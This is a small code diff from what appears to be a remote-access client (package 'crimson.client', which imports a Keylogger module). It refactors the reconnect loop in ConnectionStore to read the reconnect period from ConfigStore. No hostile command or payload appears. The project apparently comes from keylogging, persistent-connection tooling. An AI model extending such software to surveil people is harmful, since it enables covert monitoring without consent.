@@ -24,7 +24,6 @@ import java.util.List;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.ShutdownHook;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.net.ClientConnector;
@@ -82,7 +81,7 @@ public final class ConnectionStore {
 					} catch (ConnectException e) {
 
 					}
-					Thread.sleep(Client.ic.getReconnectPeriod());
+					Thread.sleep(ConfigStore.getConfig().getReconnectPeriod());
 
 				}
 			}
